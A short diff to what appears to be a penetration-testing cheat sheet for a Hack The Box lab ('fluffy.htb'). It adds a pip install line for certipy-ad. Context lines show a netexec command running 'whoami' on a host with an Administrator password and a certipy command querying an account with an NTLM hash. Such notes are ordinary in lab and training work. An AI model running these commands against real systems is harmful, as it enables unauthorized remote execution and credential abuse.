@@ -3192,6 +3192,9 @@ netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-m
 ## certipy
 
 ```
+# install tool
+sudo python3 -m pip install certipy-ad
+
 # get info of account ca_svc
 certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read  -target 10.48.172.106 -dc-ip  10.48.172.106
 
